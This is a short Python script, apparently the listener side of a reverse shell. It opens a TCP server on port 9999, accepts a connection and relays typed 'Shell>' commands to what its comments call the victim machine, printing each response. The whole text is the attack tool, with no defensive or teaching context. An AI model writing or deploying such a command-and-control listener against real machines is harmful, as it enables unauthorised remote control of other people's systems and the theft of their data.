import socket


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 9999))  
server.listen(5)
print("Listening for connections...")

client_socket, client_address = server.accept()
print(f"Connection established with {client_address}")

while True:
    # Receive a command from the attacker
    command = input("Shell> ")

    if command == 'exit':
        break

    # Send the command to the victim machine
    client_socket.send(command.encode())

    # Receive the output from the victim
    response = client_socket.recv(1024)
    print(response.decode())

client_socket.close()
server.close()
